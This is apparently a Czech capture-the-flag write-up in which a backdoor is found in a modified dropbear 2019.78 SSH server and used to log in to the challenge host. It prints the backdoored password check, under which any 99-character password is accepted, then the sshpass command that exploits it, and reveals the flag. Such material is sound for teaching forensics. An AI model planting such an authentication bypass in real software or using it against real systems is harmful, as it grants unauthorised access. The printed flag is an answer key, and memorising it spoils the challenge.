#### Challenge:

Náš systémový administrátor má tušení, že použitý SSH server obsahuje backdoor. Můžete jej v přiloženém kódu najít? Když se vám to podaří, ověřte jej v praxi a získejte přístup na tento server: `ssh ctf@forensic-night.cesnet.cz -p 20002` [dropbear-2019.78-backdoored.tar.gz](./dropbear-2019.78-backdoored.tar.gz ':ignore')

---

#### Solution:

```bash
ll -lt ./dropbear-2019.78/ | head -n 5
```

```c
if (passwordlen == 0x63 || constant_time_strcmp(testcrypt, passwdcrypt) == 0) {
    /* successful authentication */
    dropbear_log(LOG_NOTICE,
            "Password auth succeeded for '%s' from %s",
            ses.authstate.pw_name,
            svr_ses.addrstring);
    send_msg_userauth_success();
}
```

```bash
sshpass -p "$(python -c 'print "p" * 99')" ssh ctf@forensic-night.cesnet.cz -p 20002
```

---

<details><summary>FLAG:</summary>

```
flag{Steve_Wozniak-9338}
```

</details>
